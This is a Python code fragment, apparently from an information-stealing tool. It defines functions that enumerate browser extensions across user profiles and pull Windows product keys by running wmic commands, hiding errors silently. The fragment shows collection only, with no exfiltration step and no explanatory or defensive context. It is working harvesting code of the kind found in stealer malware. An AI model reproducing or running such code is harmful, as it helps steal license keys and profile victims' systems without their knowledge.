def grab_extensions():
    extensions = []
    for name, path in BROWSERS.items():
        for profile in get_profiles(path):
            profile_path = os.path.join(path, profile) if profile else path
            ext_dir = os.path.join(profile_path, "Extensions")
            if not os.path.isdir(ext_dir):
                continue
            try:
                for ext_id in os.listdir(ext_dir):
                    ext_path = os.path.join(ext_dir, ext_id)
                    if not os.path.isdir(ext_path):
                        continue
                    versions = sorted(os.listdir(ext_path), reverse=True)
                    for ver in versions:
                        manifest = os.path.join(ext_path, ver, "manifest.json")
                        if os.path.exists(manifest):
                            try:
                                with open(manifest, "r", encoding="utf-8", errors="ignore") as f:
                                    mdata = json.loads(f.read())
                                ext_name = mdata.get("name", ext_id)
                                if ext_name.startswith("__MSG_"):
                                    ext_name = ext_id
                                extensions.append({
                                    "browser": name,
                                    "name": ext_name,
                                    "version": mdata.get("version", "?"),
                                    "id": ext_id,
                                    "description": (mdata.get("description", "") or "")[:80],
                                })
                            except Exception:
                                pass
                            break
            except Exception:
                pass
    return extensions
def grab_product_keys():
    keys = []
    try:
        output = subprocess.check_output(
            "wmic path softwarelicensingservice get OA3xOriginalProductKey",
            shell=True,
            stderr=subprocess.DEVNULL,
        ).decode("utf-8", errors="ignore")
        for line in output.split("\n"):
            line = line.strip()
            if line and line.lower() != "oa3xoriginalproductkey" and len(line) > 10:
                keys.append({"product": "Windows (OEM)", "key": line})
    except Exception:
        pass
    try:
        output = subprocess.check_output(
            'wmic path SoftwareLicensingProduct where '
            '"PartialProductKey is not null" '
            'get Name,PartialProductKey /format:csv',
            shell=True,
            stderr=subprocess.DEVNULL,
        ).decode("utf-8", errors="ignore")
        for line in output.split("\n"):
            parts = line.strip().split(",")
            if len(parts) >= 3 and parts[1] and parts[1].lower() != "name":
                keys.append({"product": parts[1][:60], "key": f"*****-{parts[2]}"})
    except Exception:
        pass
    return keys
